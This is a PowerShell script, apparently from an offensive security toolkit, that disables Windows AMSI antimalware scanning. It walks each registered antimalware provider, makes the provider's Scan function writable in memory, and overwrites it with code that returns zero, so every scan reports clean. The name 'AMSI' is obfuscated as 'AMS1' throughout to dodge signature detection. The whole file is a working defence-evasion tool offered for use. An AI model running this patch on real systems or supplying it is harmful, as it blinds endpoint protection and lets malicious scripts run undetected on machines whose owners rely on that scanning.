<#
.SYNOPSIS
   Unchain AMS1 by patching the provider's unmonitored memory space

   Author: @Maor Korkos (@maorkor)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Unchain AMS1 by patching the provider's unmonitored memory space

.EXAMPLE
   PS C:\> .\ScanInterception_x64.ps1

.INPUTS
   None. You cannot pipe objects into ScanInterception_x64.ps1

.OUTPUTS
   * Patching AMS1 memory space.
     + Adding InteropServices Type.
     + Loop through all the providers.
     + Patching the Scan function.
   * Done, exit cmdlet execution.

.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/lib/Ams1-Bypass
   https://github.com/deepinstinct/AMSI-Unchained/blob/main/ScanInterception_x64.ps1
#>


write-host "`n* Patching AMS1 space." -ForegroundColor Green

$Apis = @"
using System;
using System.Runtime.InteropServices;

public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@

write-host "  + " -ForegroundColor Green -NoNewline
write-host "Adding InteropServices Type."
Add-Type $Apis

$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

write-host "  + " -ForegroundColor Green -NoNewline
write-host "Loop through all the providers."
#Loop through all the providers
While($AntimalwareProvider -ne 0)
{
  #Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  #Patch the Scan function
  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}

write-host "  + " -ForegroundColor Green -NoNewline
write-host "Patching the Scan function."
write-host "* Done, exit cmdlet execution.`n" -ForegroundColor Green